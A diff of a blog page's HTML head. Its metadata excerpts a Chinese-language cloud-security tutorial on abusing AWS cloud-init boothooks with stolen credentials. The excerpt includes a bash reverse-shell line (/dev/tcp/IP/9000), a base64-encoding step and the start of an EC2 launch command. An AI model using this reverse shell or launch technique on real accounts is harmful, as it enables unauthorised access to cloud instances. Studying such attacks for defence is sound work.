@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='http://localhost:1313/p/day-26-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-reverse-shell-via-credential/'>
 
-<link rel="stylesheet" href="/scss/style.min.d8118f156935b64eca93aca758476adca858d2c47354971654d9bd2933a0e45f.css"><meta property='og:title' content="[Day 26] 天堂雲端 - reverse shell via credential">
+<link rel="stylesheet" href="/scss/style.min.c7c03936adecbbfd2050017468829a90830458726defff133b601ad15ba6780a.css"><meta property='og:title' content="[Day 26] 天堂雲端 - reverse shell via credential">
 <meta property='og:description' content="AWS CloudInit cloud-init package是Canonical建構的開源應用程式，用於引導在雲端環境中的Linux image。AWS CloudInit是一種用於自動化EC2 instance初始化和設置的工具，可以在EC2 instance啟動過程中執行各種初始化任務。 AWS Cloud Boothook AWS Cloud Boothhook是用於EC2 instance啟動期間執行自定義命令的機制。具體來說，boothook是cloudinit配置的一部份，主要用於： 自定義初始化行為 自動化任務 Reverse shell Build reverse shell code 建立reverse shell，這裡用bash做示範 backdoor.sh 1 2 3 #!/bin/bash echo &#34;Hello World&#34; &gt;&gt; hello.txt /bin/bash -i &gt;&amp; /dev/tcp/IP/9000 0&gt;&amp;1 # Revese shell範例 backdoor_encoded.sh 1 base64 -i blackdoor.sh &gt; blackdoor_encoded.sh # 這是Mac的寫法 啟動新的EC2 instance 攻擊者已經獲取合法有限權限，其中包括啟動新實例所需的權限。 iam:PassRole ec2:RunInstances 1 2 3 4 5 6 7 &gt; aws ec2 run-instances \\ --image-id ami-xxxxxxxxxxxxxxxxx \\ --instance-type t2.">
 <meta property='og:url' content='http://localhost:1313/p/day-26-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-reverse-shell-via-credential/'>
 <meta property='og:site_name' content='Sunny Site'>
